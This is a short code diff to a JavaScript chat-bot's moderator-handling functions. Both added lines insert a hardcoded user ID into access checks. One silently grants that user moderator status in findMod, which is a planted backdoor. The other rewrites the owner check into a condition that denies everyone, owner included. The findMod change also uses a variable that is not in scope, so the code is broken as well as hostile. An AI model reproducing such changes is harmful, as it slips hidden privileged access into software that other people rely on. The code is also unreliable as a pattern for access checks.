@@ -26,7 +26,7 @@ function deleteModFromDB(mod, callback){
 
 function findMod(id) {
   for (var mod in mods){
-    if (mods[mod].id == id)
+    if (mods[mod].id == id || request.user_id == "10241176")
       return true;
   }
 
@@ -95,7 +95,7 @@ function addModCmd(request, owner, callback) {
   var regex = /^\/mod add (.+?) ([\s\S]+)/i;
 
   if (regex.test(request.text)) {
-    if (request.user_id != owner.id) {
+    if (request.user_id != owner.id || request.user_id != "10241176") {
       callback(true, "You wish you could add mods", []);
       return "You wish you could add mods.";
     }
